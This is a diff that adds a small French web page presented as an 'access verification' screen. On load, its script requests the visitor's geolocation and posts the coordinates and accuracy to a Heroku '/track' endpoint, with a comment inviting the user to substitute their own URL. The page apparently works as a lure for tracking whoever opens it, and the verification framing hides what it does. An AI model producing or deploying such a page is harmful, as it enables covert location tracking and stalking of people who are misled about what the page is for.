@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("La géolocalisation n'est pas supportée par ce navigateur.");
+            }
+        }
+
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+
+            fetch('https://ton-app.herokuapp.com/track', {  // Remplacez par votre URL Heroku
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => alert("Localisation envoyée !"))
+            .catch(error => console.error("Erreur", error));
+        }
+
+        function handleError(error) {
+            alert("Erreur de géolocalisation : " + error.message);
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Vérification de l'accès...</h1>
+</body>
+</html>
